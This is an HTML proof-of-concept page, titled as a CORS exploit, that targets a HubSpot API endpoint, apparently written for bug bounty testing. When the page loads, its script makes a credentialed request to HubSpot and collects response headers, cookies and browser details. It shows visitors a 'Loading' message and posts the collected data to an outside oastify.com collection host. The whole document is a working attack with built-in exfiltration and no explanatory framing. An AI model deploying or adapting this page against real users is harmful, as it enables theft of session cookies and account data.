<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploit - Get HubSpot Cookies</title>
</head>
<body>
    <h1>Loading... Please wait</h1>
    <div id="status">Sending request...</div>
    <script>
    (function() {
        // Send correct request to HubSpot API
        fetch('https://app.hubspot.com/api/usage-logging/v1/log/hublytics-multi/no-auth', {
            method: 'POST',
            credentials: 'include',  // IMPORTANT: This sends cookies
            headers: {
                'Content-Type': 'application/json',
                'Accept': 'application/json'
                // Don't set Origin manually - browser handles it
            },
            body: JSON.stringify([{
                event: 'page_view',
                properties: {
                    url: 'https://example.com',
                    timestamp: new Date().toISOString(),
                    // Add required fields to avoid 400 error
                    app: 'hubspot',
                    screen: 'test',
                    accountId: 'test'
                }
            }])
        })
        .then(response => {
            // Get the response including any Set-Cookie headers
            var setCookie = response.headers.get('Set-Cookie') || 'No Set-Cookie header';
            
            // Get all headers
            var headers = {};
            response.headers.forEach((value, key) => {
                headers[key] = value;
            });
            
            return response.text().then(data => {
                return {
                    status: response.status,
                    statusText: response.statusText,
                    headers: headers,
                    setCookie: setCookie,
                    body: data,
                    url: response.url,
                    // Try to get cookies from document (if any)
                    documentCookies: document.cookie || 'No document.cookie'
                };
            });
        })
        .then(result => {
            // Send everything to Collaborator
            var payload = {
                type: 'CORS_Exploit_Result',
                result: result,
                // Also include any cookies we can access
                cookies_from_document: document.cookie || 'No cookies accessible',
                // Include browser info
                browser_info: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    cookieEnabled: navigator.cookieEnabled
                },
                timestamp: new Date().toISOString(),
                origin: window.location.origin,
                href: window.location.href
            };
            
            // Send to Collaborator
            return fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });
        })
        .then(() => {
            document.getElementById('status').innerHTML = '✅ Data sent to Collaborator! Check your logs.';
            console.log('[+] Success!');
        })
        .catch(error => {
            document.getElementById('status').innerHTML = '❌ Error: ' + error.toString();
            console.error('[-] Error:', error);
            
            // Send error to Collaborator
            fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
                method: 'POST',
                mode: 'no-cors',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    type: 'ERROR',
                    error: error.toString(),
                    stack: error.stack,
                    timestamp: new Date().toISOString()
                })
            });
        });
    })();
    </script>
</body>
</html>
